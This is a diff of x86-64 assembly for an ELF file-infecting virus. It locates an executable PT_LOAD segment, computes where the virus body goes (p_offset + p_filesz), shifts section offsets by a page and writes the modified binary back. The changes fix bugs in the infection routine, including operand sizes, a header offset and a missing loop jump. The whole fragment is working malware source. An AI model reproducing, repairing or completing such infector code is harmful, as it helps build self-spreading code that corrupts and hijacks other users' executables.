@@ -28,7 +28,6 @@ _update_mmaped_file:
 
 	mov QWORD [rsp + 24], r10
 
-
 	mov r10, QWORD [rsp]
 	mov QWORD [rsp + 32], r10
 	add QWORD [rsp + 32], 32
@@ -52,9 +51,10 @@ _update_mmaped_file:
 	mov r10, QWORD [rsp]
 	mov QWORD [rsp + 56], r10
 	add QWORD [rsp + 56], 56
+	mov r11, QWORD [rsp + 56]
 	xor r10, r10
-	mov r10d, DWORD [rsp + 56]
-	mov r10d, DWORD [r10]
+	mov r10w, WORD [r11]
+;	mov r10w, WORD [r11]
 	mov QWORD [rsp + 56], r10
 
 	mov QWORD [rsp + 64], 0
@@ -81,12 +81,12 @@ _if:
 
 _else_if:
 	mov r10, QWORD [rsp + 32] ; if phdr->p_type == PT_LOAD
-	cmp DWORD [r10d], 1
+	cmp DWORD [r10], 1
 	jne _inc_jmp_loop
 	add r10, 4 ; offset of p_flags
 	mov r10d, DWORD [r10]
 	and r10d, 1
-	cmp DWORD [r10d], 1 ; if phdr->p_flags & PF_X
+	cmp r10d, 1 ; if phdr->p_flags & PF_X
 	jne _inc_jmp_loop
 ; virus offset = phdr->p_offset + phdr->p_filesz
 	mov r10, QWORD [rsp + 32]
@@ -129,9 +129,10 @@ _init_treat_all_sections:
 	mov r10, QWORD [rsp]
 	mov QWORD [rsp + 56], r10
 	add QWORD [rsp + 56], 60
+	mov r11, QWORD [rsp + 56]
 	xor r10, r10
-	mov r10d, DWORD [rsp + 56]
-	mov r10d, DWORD [r10]
+	mov r10w, WORD [r11]
+;	mov r10w, WORD [r10]
 	mov QWORD [rsp + 56], r10
 
 _treat_all_sections:
@@ -171,8 +172,8 @@ _inc_jmp_loop_sections:
 
 _write_in_fd:
 	mov r10, QWORD [rsp] ; add PAGESIZE to sections offset
-	add r10, 60
-	add DWORD [r10], 4096
+	add r10, 40
+	add QWORD [r10], 4096
 ; write(fd, map, virus_offset);
 	mov rax, 1
 	mov rdi, QWORD [rsp + 24] ; fd
@@ -211,6 +212,7 @@ _loop:
 	mov rdx, 1; size
 	syscall
 	inc QWORD [rsp + 96]
+	jmp _loop
 
 _last_write:
 	mov rax, 1
